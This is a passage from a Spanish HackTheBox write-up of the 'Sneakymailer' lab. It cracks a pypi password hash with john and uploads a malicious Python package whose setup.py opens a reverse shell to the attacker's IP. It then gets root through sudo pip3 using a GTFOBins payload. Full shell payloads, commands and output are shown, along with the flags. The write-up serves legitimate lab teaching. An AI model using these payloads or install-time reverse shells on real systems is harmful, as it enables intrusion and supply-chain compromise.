pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos una contraseña encryptada que procederemos a crackearla por fuerza bruta con &lt;code&gt;john&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
soufianeelhaoui  (?)
1g 0:00:00:08 DONE (2023-04-08 23:53) 0.1172g/s 419023p/s 419023c/s 419023C/s soulfire1..souderton16
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos nuevas credenciales &lt;code&gt;pypi:soufianeelhaoui&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Como vimos que por detras esta configurado un &lt;code&gt;nginx&lt;/code&gt; vamos a listar los sitios disponibles del directorio &lt;code&gt;sites-available&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Encotramos el subdominio &lt;code&gt;pypi.sneakycorp.htb&lt;/code&gt; que esta en escucha por el puerto &lt;code&gt;8080&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /etc/nginx/sites-available/pypi.sneakycorp.htb 
server {
	listen 0.0.0.0:8080 default_server;
	listen [::]:8080 default_server;
	server_name _;
}


server {
	listen 0.0.0.0:8080;
	listen [::]:8080;

	server_name pypi.sneakycorp.htb;

	location / {
		proxy_pass http://127.0.0.1:5000;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Agregamos el subdominio al &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.197 pypi.sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo abrimos en el navegador&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos un &lt;code&gt;pypi server&lt;/code&gt; lo que podriamos hacer es tratar de crearnos nuestro propio paquete malicioso de &lt;code&gt;pypi&lt;/code&gt; y tratar de subirlo a la maquina victima e intentar colar un comando en la maquina victima.&lt;/p&gt;

&lt;p&gt;Ahora la pregunta es como creamos un paquete en python?&lt;/p&gt;

&lt;p&gt;Solo debes seguir la guia de este recurso donde se explica a detalle como hacerlo&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/&quot;&gt;https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La estructura al crear un paquete debe ser similar a esta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;linode_example/
    linode_example/
        __init__.py
    setup.py
    setup.cfg
    README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces procederemos a crear una estructura similar en nuestra maquina en este caso pondre de nombre a los directorios como &lt;code&gt;package&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 package   setup.cfg   setup.py
❯ tree
.
├── package
│   ├── __init__.py
│   └── package
├── setup.cfg
└── setup.py

2 directories, 3 files
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera editar el &lt;code&gt;setup.py&lt;/code&gt;, donde ademas añadiremos un codigo para ejecutarnos una &lt;code&gt;reverse shell&lt;/code&gt; que se ejecutara cuando se inicie el &lt;code&gt;setup.py&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from setuptools import setup

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&quot;10.10.16.2&quot;,443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])

setup(
    name='linode_example',
    #packages=['linode_example'],
    description='Hello world enterprise edition',
    version='0.1',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example']
    )
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Comentar o borrar la linea de &lt;code&gt;packages=['linode_example']&lt;/code&gt; ya que suele dar problema.&lt;/p&gt;

&lt;p&gt;Ahora lo que tenemos que hacer es que el servidor de la maquina victima al momento de instalar el paquete me ejecute la &lt;code&gt;reverse shell&lt;/code&gt; y eso lo hariamos creando un archivo &lt;code&gt;.pypirc&lt;/code&gt; donde definamos cual es el repositorio al cual te quieras conectar y las credenciales de autenticación que de antes la tenemos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat ~/.pypirc
[distutils]
index-servers = sneakypwned
[sneakypwned]
repository: http://pypi.sneakycorp.htb:8080/
username: pypi
password: soufianeelhaoui
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por ultimo sera ejecutar el siguiente comando para tratar de cargar el paquete en la maquina victima &lt;code&gt;python3 setup.py sdist upload -r linode&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Donde reeemplazaremos &lt;code&gt;linode&lt;/code&gt; por el nombre que pusimos el el &lt;code&gt;index-servers&lt;/code&gt; en el &lt;code&gt;.pypirc&lt;/code&gt; que en nuestro caso es sneakypwned&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;python3 setup.py sdist upload -r sneakypwned
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;setup.py&lt;/code&gt; y nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.16.2.
Ncat: Connection from 10.10.16.2:46076.
# whoami
root
# pwd
/home/fmiracle/Machines/Sneakymailer/content/create
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero vemos que nos hace una conexión a nuestra propia maquina, esto es por que primero se ejecuta la conexión locamente&lt;/p&gt;

&lt;p&gt;Lo que debemos hacer es volver a ponernos en escucha con &lt;code&gt;ncat&lt;/code&gt; y salir de nuestra conexión local con un &lt;code&gt;exit&lt;/code&gt; esto hara que se ejecute la conexión esta vez de la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.16.2.
Ncat: Connection from 10.10.16.2:37168.
# whoami
root
# pwd
/home/fmiracle/Machines/Sneakymailer/content/create
# exit
running sdist
running egg_info
writing linode_example.egg-info/PKG-INFO
writing dependency_links to linode_example.egg-info/dependency_links.txt
writing top-level names to linode_example.egg-info/top_level.txt
reading manifest file 'linode_example.egg-info/SOURCES.txt'
writing manifest file 'linode_example.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating linode_example-0.1
creating linode_example-0.1/linode_example.egg-info
creating linode_example-0.1/package
copying files to linode_example-0.1...
copying setup.cfg -&amp;gt; linode_example-0.1
copying setup.py -&amp;gt; linode_example-0.1
copying linode_example.egg-info/PKG-INFO -&amp;gt; linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/SOURCES.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/dependency_links.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/top_level.txt -&amp;gt; linode_example-0.1/linode_example.egg-info
copying package/__init__.py -&amp;gt; linode_example-0.1/package
Writing linode_example-0.1/setup.cfg
Creating tar archive
removing 'linode_example-0.1' (and everything under it)
running upload
Submitting dist/linode_example-0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response (200): OK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la conexión desde la maquina victima como el usuario &lt;code&gt;low&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:45570.
$ whoami
low
$ hostname -I
10.10.10.197 dead:beef::250:56ff:feb9:6b16 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Realizamos nuevamente un tratamiento de la &lt;code&gt;tty&lt;/code&gt; como ya hicimos anteriormente, nos dirigimos al directorio personal del usuario y podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:/$ cd /home
low@sneakymailer:/home$ ls
low  vmail
low@sneakymailer:/home$ cd low/
low@sneakymailer:~$ cat user.txt 
4a39c61b14f3e1c7c83014390f90942e
low@sneakymailer:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ejecutamos el comando &lt;code&gt;sudo -l&lt;/code&gt; para ver si tenemos privilegios a nivel de &lt;code&gt;sudoers&lt;/code&gt; y vemos que tenemos uno asociado al comando &lt;code&gt;pip3&lt;/code&gt; el cual podemos ejecutar como &lt;code&gt;root&lt;/code&gt; de forma temporal sin requerir contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera dirigirnos a nuestra web de confianza&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;https://gtfobins.github.io/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ahi podemos ver que si tenemos el privilegio de sudo en &lt;code&gt;pip3&lt;/code&gt;, debemos ejecutar los siguentes comandos y nos convertiremos en el usuario &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo &quot;import os; os.execl('/bin/sh', 'sh', '-c', 'sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)')&quot; &amp;gt; $TF/setup.py
low@sneakymailer:~$ sudo pip install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
[sudo] password for low: 
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo &quot;import os; os.execl('/bin/sh', 'sh', '-c', 'sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)')&quot; &amp;gt; $TF/setup.py
low@sneakymailer:~$ sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.25RDYk7IwK
# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente podemos dirigirnos al directorio de &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# cd /root
# cat root.txt
25ae2132a2ff299928b234e186ad53ec
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Sneakymailer</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Sneakymailer</guid>
        
        <category>Information Leaked</category>
        
        <category>Emailing Attack</category>
        
        <category>Abussing Pypi Server</category>
        
        <category>Sudoers Privilege pip3</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
  </channel>
</rss>
